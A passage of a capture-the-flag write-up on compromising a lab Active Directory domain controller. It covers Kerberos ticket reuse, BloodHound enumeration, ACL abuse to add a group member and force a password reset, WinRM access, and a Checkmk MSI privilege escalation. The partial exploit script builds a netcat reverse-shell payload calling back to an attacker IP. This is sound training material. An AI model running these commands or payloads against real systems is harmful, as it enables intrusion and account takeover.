+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>web_svc.ccache</span></span></code></pre></td></tr></table></div></div></div><blockquote><p>By setting this variable, any subsequently executed Kerberos-aware tools (such as <code>secretsdump.py</code>, <code>psexec.py</code>, or <code>nxc</code>) will automatically read the ticket from <code>web_svc.ccache</code> instead of prompting for a password or NTLM hash, enabling seamless <strong>Pass-the-Ticket (PtT)</strong> authentication across the Active Directory domain.</p></blockquote><h2 id=active-directory-enumeration-via-bloodhound id=active-directory-enumeration-via-bloodhound><span class=me-2>Active Directory Enumeration via BloodHound</span>
+<a href=#active-directory-enumeration-via-bloodhound class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>To map out the relationships, group memberships, and potential attack paths within the Active Directory domain, we execute <strong>BloodHound-python</strong>.</p><p>Since we previously exported our TGT via the <code>KRB5CCNAME</code> environment variable, we can leverage Kerberos authentication directly using the <code>-k</code> flag:</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> ╭─nabiasa@nabiasa in ~/Desktop/AD
+</span></span><span class=line><span class=cl> ╰─λ bloodhound-python -u <span class=s1>&#39;WEB_SVC&#39;</span> -p <span class=s1>&#39;dksehdgh712!@#&#39;</span> -d nanocorp.htb -c All -o bloodhound_results.json -ns 10.129.231.124 -k
+</span></span><span class=line><span class=cl>INFO: BloodHound.py <span class=k>for</span> BloodHound LEGACY <span class=o>(</span>BloodHound 4.2 and 4.3<span class=o>)</span>
+</span></span><span class=line><span class=cl>INFO: Found AD domain: nanocorp.htb
+</span></span><span class=line><span class=cl>INFO: Getting TGT <span class=k>for</span> user
+</span></span><span class=line><span class=cl>INFO: Connecting to LDAP server: dc01.nanocorp.htb
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> domains
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> domains in the forest
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> computers
+</span></span><span class=line><span class=cl>INFO: Connecting to LDAP server: dc01.nanocorp.htb
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>6</span> users
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>53</span> groups
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>2</span> gpos
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>2</span> ous
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>19</span> containers
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>0</span> trusts
+</span></span><span class=line><span class=cl>INFO: Starting computer enumeration with <span class=m>10</span> workers
+</span></span><span class=line><span class=cl>INFO: Querying computer: DC01.nanocorp.htb
+</span></span><span class=line><span class=cl>INFO: Done in 00M 34S</span></span></code></pre></td></tr></table></div></div></div><blockquote class=prompt-tip><p>Alternative Graph == collect rusthound-python</p></blockquote><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> ╭─nabiasa@nabiasa in ~/Desktop/AD 
+</span></span><span class=line><span class=cl> ╰─λ rusthound-ce -d nanocorp.htb -f dc01.nanocorp.htb -k
+</span></span><span class=line><span class=cl>---------------------------------------------------
+</span></span><span class=line><span class=cl>Initializing RustHound-CE at 20:38:23 on 05/16/26
+</span></span><span class=line><span class=cl>Powered by @g0h4n_0
+</span></span><span class=line><span class=cl>---------------------------------------------------
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>2026-05-16T13:38:23Z INFO  rusthound_ce<span class=o>]</span> Verbosity level: Info
+</span></span><span class=line><span class=cl><span class=o>[</span>2026-05-16T13:38:23Z INFO  rusthound_ce<span class=o>]</span> Collection method: All
+</span></span><span class=line><span class=cl><span class=o>[</span>2026-05-16T13:38:24Z INFO  rusthound_ce::ldap<span class=o>]</span> Connected to NANOCORP.HTB Active Directory!
+</span></span><span class=line><span class=cl><span class=o>[</span>2026-05-16T13:38:24Z INFO  rusthound_ce::ldap<span class=o>]</span> Starting data collection...
+</span></span><span class=line><span class=cl><span class=o>[</span>2026-05-16T13:38:24Z INFO  rusthound_ce::ldap<span class=o>]</span> Ldap filter : <span class=o>(</span><span class=nv>objectClass</span><span class=o>=</span>*<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>2026-05-16T13:38:26Z INFO  rusthound_ce::ldap<span class=o>]</span> All data collected <span class=k>for</span> NamingContext 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>RustHound-CE Enumeration Completed at 20:38:30 on 05/16/26! Happy Graphing!</span></span></code></pre></td></tr></table></div></div></div><h3 id=command-breakdown id=command-breakdown><span class=me-2>Command Breakdown</span>
+<a href=#command-breakdown class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li><strong><code>-u 'WEB_SVC' -p 'dksehdgh712!@#'</code></strong>: Authenticates using the domain credentials for our foothold service account.</li><li><strong><code>-d nanocorp.htb</code></strong>: Targets the <code>nanocorp.htb</code> domain.</li><li><strong><code>-c All</code></strong>: Collects all available AD database information, including ACLs, Group Memberships, GPOs, and Trust Relationships.</li><li><strong><code>-ns 10.129.231.124</code></strong>: Specifies the Domain Controller as our primary name server to resolve internal objects.</li><li><strong><code>-k</code></strong>: Instructs the ingestor to utilize our active Kerberos credential cache for the authentication exchange.</li></ul><blockquote class=prompt-info><p>While standard BloodHound collectors generate the JSON files required to map the shortest path to Domain Admin in the GUI, NetExec (<code>nxc</code>) provides an efficient command-line alternative for targeted enumerationsuch as inspecting specific DACLs (<code>daclread</code>) promising from an offensive perspective:</p></blockquote><blockquote><ul><li>GenericAll,</li><li>WriteDacl,</li><li>GenericWrite (Self + WriteProperty),</li><li>WriteOwner</li><li>AllExtendedRights</li><li>(DS-Replication-Get-Changes(All)</li><li>User-Force-Change-Password)</li></ul></blockquote><blockquote class=prompt-tip><p>mind map for ACL abuse : <a href=https://www.thehacker.recipes/ad/movement/dacl>https://www.thehacker.recipes/ad/movement/dacl</a>.</p></blockquote><div class=code-block><div class=code-header><span data-label-text><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>╭─nabiasa@nabiasa in ~/Desktop/AD
+</span></span><span class=line><span class=cl>   ❯ nxc ldap 10.129.243.199 -u &#39;web_svc&#39; -p &#39;dksehdgh712!@#&#39; -M daclread
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl>╭─nabiasa@nabiasa in ~/Desktop/AD 
+</span></span><span class=line><span class=cl>   ❯ nxc ldap 10.129.243.199 -u &#39;web_svc&#39; -p &#39;dksehdgh712!@#&#39; -M daclread -o TARGET=monitoring_svc</span></span></code></pre></td></tr></table></div></div></div><h2 id=active-directory-acl-abuse-addself-to-group id=active-directory-acl-abuse-addself-to-group><span class=me-2>Active Directory ACL Abuse (AddSelf to Group)</span>
+<a href=#active-directory-acl-abuse-addself-to-group class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Analyzing the imported data in <strong>BloodHound</strong> reveals an exploitable Active Directory Access Control List (ACL) relationship:</p><a href=/res/20260517104828.png class="popup img-link"><img src=/res/20260517104828.png alt></a><ul><li><strong>Source Principal:</strong> <code>WEB_SVC@NANOCORP.HTB</code></li><li><strong>Target Group:</strong> <code>IT_SUPPORT@NANOCORP.HTB</code></li><li><strong>Relationship / Privilege:</strong> <code>AddSelf</code></li></ul><blockquote class=prompt-warning><p>The <strong>AddSelf</strong> privilege allows our compromised user account to add itself directly as a member of the target group without needing high-privileged domain administrative rights.</p></blockquote><h3 id=exploiting-the-acl-with-bloodyad id=exploiting-the-acl-with-bloodyad><span class=me-2>Exploiting the ACL with bloodyAD</span>
+<a href=#exploiting-the-acl-with-bloodyad class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We utilize the Active Directory framework tool <strong>bloodyAD</strong> to execute this group modification over LDAP:</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> ╭─nabiasa@nabiasa in ~/Desktop/AD 🧙
+</span></span><span class=line><span class=cl> ╰─λ bloodyad --host 10.129.231.124 -d nanocorp.htb -u web_svc -p <span class=s1>&#39;dksehdgh712!@#&#39;</span> add groupMember IT_Support web_svc
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> web_svc added to IT_Support</span></span></code></pre></td></tr></table></div></div></div><h3 id=key-outcome--next-steps id=key-outcome--next-steps><span class=me-2>Key Outcome & Next Steps</span>
+<a href=#key-outcome--next-steps class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The command successfully completes, and <code>web_svc</code> is now a verified member of the <strong><code>IT_Support</code></strong> group. We will now perform a new round of domain enumeration to determine what additional permissions, GPOs, or system access this newly acquired group membership grants us.</p><h2 id=active-directory-group-privilege-abuse-forcechangepassword id=active-directory-group-privilege-abuse-forcechangepassword><span class=me-2>Active Directory Group Privilege Abuse (ForceChangePassword)</span>
+<a href=#active-directory-group-privilege-abuse-forcechangepassword class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>With our foothold account (<code>web_svc</code>) successfully added to the <strong><code>IT_Support</code></strong> group, we re-evaluate our attack path within BloodHound.</p><a href=/res/20260517105051.png class="popup img-link"><img src=/res/20260517105051.png alt></a><h3 id=analyzing-the-inherited-acl id=analyzing-the-inherited-acl><span class=me-2>Analyzing the Inherited ACL</span>
+<a href=#analyzing-the-inherited-acl class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The BloodHound path analysis reveals a new privilege pathway:</p><ul><li><strong>Source Group:</strong> <code>IT_SUPPORT@NANOCORP.HTB</code></li><li><strong>Target User:</strong> <code>MONITORING_SVC@NANOCORP.HTB</code></li><li><strong>Relationship / Privilege:</strong> <code>ForceChangePassword</code> (Inherited)</li></ul><p>Because members of the <code>IT_Support</code> group possess the <strong>ForceChangePassword</strong> permission over the <code>monitoring_svc</code> user account, our user <code>web_svc</code> now inherits the right to change this target&rsquo;s password directly over LDAP without knowing its current password.</p><h3 id=resetting-the-user-password-with-bloodyad id=resetting-the-user-password-with-bloodyad><span class=me-2>Resetting the User Password with bloodyAD</span>
+<a href=#resetting-the-user-password-with-bloodyad class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We execute <strong>bloodyAD</strong> using our current <code>web_svc</code> credentials to reset the password for <code>monitoring_svc</code>.</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> ╭─nabiasa@nabiasa in ~/Desktop/AD 🧙
+</span></span><span class=line><span class=cl> ╰─λ bloodyad --host 10.129.231.124 -d nanocorp.htb -u web_svc -p <span class=s1>&#39;dksehdgh712!@#&#39;</span> <span class=nb>set</span> password monitoring_svc <span class=s1>&#39;SynTest123&#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Password changed successfully!</span></span></code></pre></td></tr></table></div></div></div><h3 id=key-outcome-1 id=key-outcome-1><span class=me-2>Key Outcome</span>
+<a href=#key-outcome-1 class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The password reset is successful. We have successfully hijacked the target service account and obtained a new set of valid domain credentials:</p><ul><li><strong>Username:</strong> <code>monitoring_svc</code></li><li><strong>Password:</strong> <code>SynTest123</code></li></ul><h2 id=escalating-privileges--tgt-retrieval-monitoring_svc id=escalating-privileges--tgt-retrieval-monitoring_svc><span class=me-2>Escalating Privileges & TGT Retrieval (<code>monitoring_svc</code>)</span>
+<a href=#escalating-privileges--tgt-retrieval-monitoring_svc class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now that we have successfully reset the password for the <strong><code>monitoring_svc</code></strong> account, we must acquire a new Kerberos Ticket Granting Ticket (TGT) to authenticate with its higher privileges across the domain.</p><p>We use Impacket&rsquo;s <code>getTGT.py</code> to request the ticket using our newly set credentials:</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>getTGT.py -dc-ip 10.129.231.124 NANOCORP.HTB/monitoring_svc:SynTest@123</span></span></code></pre></td></tr></table></div></div></div><h2 id=remote-access-via-winrm-remote-management-users id=remote-access-via-winrm-remote-management-users><span class=me-2>Remote Access via WinRM (Remote Management Users)</span>
+<a href=#remote-access-via-winrm-remote-management-users class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>After taking control of the <code>monitoring_svc</code> account, we analyze its Active Directory group memberships to identify our vector for interactive access.</p><h3 id=group-membership-analysis id=group-membership-analysis><span class=me-2>Group Membership Analysis</span>
+<a href=#group-membership-analysis class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>BloodHound mapping reveals that the <strong><code>MONITORING_SVC@NANOCORP.HTB</code></strong> account is a direct member of the built-in Windows group:</p><a href=/res/20260517125621.png class="popup img-link"><img src=/res/20260517125621.png alt></a><ul><li><strong>Target Group:</strong> <code>REMOTE MANAGEMENT USERS@NANOCORP.HTB</code></li><li><strong>Relationship:</strong> <code>MemberOf</code></li><li><strong>Distinguished Name:</strong> <code>CN=REMOTE MANAGEMENT USERS,CN=BUILTIN,DC=NANOCORP,DC=HTB</code></li></ul><blockquote class=prompt-info><p>Members of this group are explicitly authorized to access Windows Management Instrumentation (WMI) resources and establish remote administrative sessions over WS-Management (WS-Man) via the <strong>Windows Remote Management (WinRM)</strong> service.</p></blockquote><h3 id=verifying-winrm-access id=verifying-winrm-access><span class=me-2>Verifying WinRM Access</span>
+<a href=#verifying-winrm-access class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Since the credentials are valid and the user belongs to the Remote Management Users group, we use <strong>winrmexec.py</strong> to establish a secure, interactive PowerShell session on the target Domain Controller:</p><h3 id=python3-winrmexecpy id=python3-winrmexecpy><span class=me-2>python3 winrmexec.py</span>
+<a href=#python3-winrmexecpy class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class=code-block><div class=code-header><span data-label-text=Cmd><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl> ╭─nabiasa@nabiasa in ~/Desktop/AD
+</span></span><span class=line><span class=cl> ╰─λ python3 winrmexec.py -ssl -port 5986 -k nanocorp.htb/monitoring_svc@dc01.nanocorp.htb -no-pass
+</span></span><span class=line><span class=cl>&#39;prompt_toolkit&#39; not installed, using built-in &#39;readline&#39;
+</span></span><span class=line><span class=cl>Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>[*] &#39;-target_ip&#39; not specified, using dc01.nanocorp.htb
+</span></span><span class=line><span class=cl>[*] &#39;-url&#39; not specified, using https://dc01.nanocorp.htb:5986/wsman
+</span></span><span class=line><span class=cl>[*] using domain and username from ccache: NANOCORP.HTB\monitoring_svc
+</span></span><span class=line><span class=cl>[*] &#39;-spn&#39; not specified, using HTTP/dc01.nanocorp.htb@NANOCORP.HTB
+</span></span><span class=line><span class=cl>[*] &#39;-dc-ip&#39; not specified, using NANOCORP.HTB
+</span></span><span class=line><span class=cl>[*] requesting TGS for HTTP/dc01.nanocorp.htb@NANOCORP.HTB
+</span></span><span class=line><span class=cl>PS C:\Users\monitoring_svc\Documents&gt;</span></span></code></pre></td></tr></table></div></div></div><p>This successfully grants us a remote shell as <code>monitoring_svc</code>, establishing our interactive foothold on the target machine <code>DC01</code>.</p><h2 id=privilege-escalation-to-nt-authoritysystem id=privilege-escalation-to-nt-authoritysystem><span class=me-2>Privilege Escalation to NT AUTHORITY\SYSTEM</span>
+<a href=#privilege-escalation-to-nt-authoritysystem class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>After establishing an interactive WinRM session as <code>monitoring_svc</code> on the Domain Controller, we inspect our local security context, privileges, and group memberships:</p><div class=code-block><div class=code-header><span data-label-text=Cmd><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>PS C:\Windows\Temp<span class=p>&gt;</span> whoami /priv
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PRIVILEGES INFORMATION
+</span></span><span class=line><span class=cl>----------------------
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Privilege Name                Description                    State
+</span></span><span class=line><span class=cl>============================= ============================== =======
+</span></span><span class=line><span class=cl>SeMachineAccountPrivilege     Add workstations to domain     Enabled
+</span></span><span class=line><span class=cl>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+</span></span><span class=line><span class=cl>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span></span></code></pre></td></tr></table></div></div></div><h3 id=whoami-groups id=whoami-groups><span class=me-2>whoami /groups</span>
+<a href=#whoami-groups class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class=code-block><div class=code-header><span data-label-text=Cmd><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>PS C:\Windows\Temp<span class=p>&gt;</span> whoami /groups
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>GROUP INFORMATION
+</span></span><span class=line><span class=cl>-----------------
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Group Name                                 Type             SID                                          Attributes               
+</span></span><span class=line><span class=cl>========================================== ================ ============================================ ==================================================
+</span></span><span class=line><span class=cl>Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>NANOCORP\Protected Users                   Group            S-1-5-21-2261381271-1331810270-697239744-525 Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>Authentication authority asserted identity Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
+</span></span><span class=line><span class=cl>Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192        </span></span></code></pre></td></tr></table></div></div></div><h3 id=the-obstacle-protected-users-group id=the-obstacle-protected-users-group><span class=me-2>The Obstacle: Protected Users Group</span>
+<a href=#the-obstacle-protected-users-group class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The output reveals that our current account, <code>monitoring_svc</code>, is a member of the <strong><code>NANOCORP\Protected Users</code></strong> group. Members of this group are subjected to strict, hardcoded caching and delegation restrictions (e.g., no NTLM credential caching, disabled delegation, and short ticket lifetimes).</p><p>To execute our local escalation exploit chain cleanly without credential delegation or execution policy blocks, we must pivot back to our initial service account, <strong><code>web_svc</code></strong>, which is not constrained by the Protected Users group.</p><h3 id=exploiting-checkmk-msi-arbitrary-file-execution id=exploiting-checkmk-msi-arbitrary-file-execution><span class=me-2>Exploiting Checkmk MSI (Arbitrary File Execution)</span>
+<a href=#exploiting-checkmk-msi-arbitrary-file-execution class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The Domain Controller has <strong>Checkmk</strong> monitoring software installed. When a Windows Installer repair operation (<code>msiexec /fa</code>) is triggered, the engine runs under the <strong><code>NT AUTHORITY\SYSTEM</code></strong> context. During this routine, the installer attempts to execute temporary configuration batch files (<code>.cmd</code>) in the public <code>C:\Windows\Temp\</code> directory. These files are dynamically named using the PID of the active installation process.</p><p>By leveraging a <strong>PID Seeding / Pre-creation</strong> attack, we can pre-create a wide range of batch files corresponding to potential future PIDs. When the installer executes and matches one of our seeded paths, it runs our payload with SYSTEM privileges.</p><h4 id=1-the-exploit-script-badps1 id=1-the-exploit-script-badps1><span class=me-2>1. The Exploit Script (<code>bad.ps1</code>)</span>
+<a href=#1-the-exploit-script-badps1 class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>We write a PowerShell helper script to seed the target directory with our payloads pointing to a local Netcat binary, then trigger the MSI repair operation:</p><div class=code-block><div class=code-header><span data-label-text=Powershell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>cat </span><span class=p>&gt;</span> <span class=n>bad</span><span class=p>.</span><span class=py>ps1</span> <span class=p>&lt;&lt;</span> <span class=s1>&#39;EOF&#39;</span>
+</span></span><span class=line><span class=cl><span class=k>param</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=no>int</span><span class=p>]</span><span class=nv>$MinPID</span> <span class=p>=</span> <span class=mf>1000</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=no>int</span><span class=p>]</span><span class=nv>$MaxPID</span> <span class=p>=</span> <span class=mf>15000</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=no>string</span><span class=p>]</span><span class=nv>$LHOST</span> <span class=p>=</span> <span class=s2>&#34;10.10.14.30&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=no>string</span><span class=p>]</span><span class=nv>$LPORT</span> <span class=p>=</span> <span class=s2>&#34;9001&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$NcPath</span> <span class=p>=</span> <span class=s2>&#34;C:\Windows\Temp\nc.exe&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>$BatchPayload</span> <span class=p>=</span> <span class=s2>&#34;@echo off</span><span class=se>`r`n</span><span class=nv>$NcPath</span><span class=s2> -e cmd.exe </span><span class=nv>$LHOST</span><span class=s2> </span><span class=nv>$LPORT</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$msi</span> <span class=p>=</span> <span class=p>(</span><span class=nb>Get-ItemProperty</span> <span class=s1>&#39;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties&#39;</span> <span class=p>|</span>
+</span></span><span class=line><span class=cl>        <span class=nb>Where-Object</span> <span class=p>{</span> <span class=nv>$_</span><span class=p>.</span><span class=py>DisplayName</span> <span class=o>-like</span> <span class=s1>&#39;*mk*&#39;</span> <span class=p>}</span> <span class=p>|</span>
+</span></span><span class=line><span class=cl>        <span class=nb>Select-Object</span> <span class=n>-First</span> <span class=mf>1</span><span class=p>).</span><span class=py>LocalPackage</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(!</span><span class=nv>$msi</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nb>Write-Error</span> <span class=s2>&#34;Could not find Checkmk MSI&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>Write-Host</span> <span class=s2>&#34;[*] Found MSI at </span><span class=nv>$msi</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>Write-Host</span> <span class=s2>&#34;[*] Seeding </span><span class=nv>$MinPID</span><span class=s2> to </span><span class=nv>$MaxPID</span><span class=s2>...&#34;</span>
